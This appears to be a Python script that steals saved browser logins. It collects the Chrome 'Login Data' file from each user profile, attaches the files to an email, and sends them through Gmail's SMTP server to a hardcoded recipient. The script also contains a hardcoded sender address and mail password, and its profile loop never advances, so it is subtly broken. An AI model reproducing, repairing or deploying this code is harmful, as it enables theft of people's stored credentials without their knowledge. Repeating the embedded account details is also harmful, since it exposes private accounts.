import os
from email.message import EmailMessage
import ssl
import smtplib

email_sender = "mnadeemstar777@gmail.com"
email_password = "zaektddcxhqebqol"
email_receiver = "Ibrahim.abid.rajput.minhas@gmail.com"

subject = "Rocket sent"

body = """
I am testing here
"""

# Create the EmailMessage object
em = EmailMessage()
em['From'] = email_sender
em['To'] = email_receiver
em['Subject'] = subject
em.set_content(body)

# Function to attach a file to the email
def attach_file(em, file_path):
    file_name = os.path.basename(file_path)
    with open(file_path, "rb") as file:
        em.add_attachment(file.read(), maintype="text", subtype="plain", filename=file_name)

# SMTP setup and sending the email
context = ssl.create_default_context()

with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    smtp.login(email_sender, email_password)

    # Fetch the current user's home directory
    home_dir = os.path.expanduser("~")

    # Iterate through profiles and attach the Login Data file
    profiles_dir = os.path.join(home_dir, "AppData", "Local", "Google", "Chrome", "User Data")
    profile_prefix = "Profile "
    index = 0
    count = 0
    items = os.listdir(profiles_dir)
    while index < len(items):
        item = items[index]
        full_path = os.path.join(profiles_dir, item)
        if os.path.isdir(full_path) and item.startswith("Profile "):
            login_data_path = os.path.join(full_path, "Login Data")
            attach_file(em, login_data_path)



    smtp.sendmail(email_sender, email_receiver, em.as_string())
